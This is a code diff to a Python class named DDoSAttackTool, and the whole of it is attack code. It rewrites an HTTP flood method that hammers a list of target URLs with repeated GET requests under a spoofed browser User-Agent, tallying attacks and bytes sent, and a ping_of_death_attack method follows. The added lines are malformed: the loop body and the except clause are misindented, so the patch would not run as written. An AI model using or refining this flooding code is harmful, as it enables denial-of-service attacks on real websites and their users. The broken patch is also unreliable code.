@@ -204,18 +204,17 @@ class DDoSAttackTool:
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
             }
 
-            with progressbar.ProgressBar(max_value=num_packets) as bar:
-                for url in urls:
-                    for i in range(num_packets):
-                        requests.get(url, headers=headers)
-                        self.attack_num += 1
-                        packet_size = len(requests.get(url, headers=headers).content)
-                        self.total_bytes_sent += packet_size
-                        print(f"Sent {self.attack_num} HTTP request to {url}")
-                        time.sleep(burst_interval)
-                        bar.update(i + 1)
-        except Exception as e:
-            print("An error occurred during the HTTP flood attack:", e)
+            for url in urls:
+            bar = progressbar.ProgressBar()
+            for i in bar(range(num_packets)):
+                requests.get(url, headers=headers)
+                self.attack_num += 1
+                packet_size = len(requests.get(url, headers=headers).content)
+                self.total_bytes_sent += packet_size
+                print(f"Sent {self.attack_num} HTTP request to {url}")
+                time.sleep(burst_interval)
+    except Exception as e:
+        print("An error occurred during the HTTP flood attack:", e)
 
     def ping_of_death_attack(self, target_ips, num_packets, burst_interval):
         try:
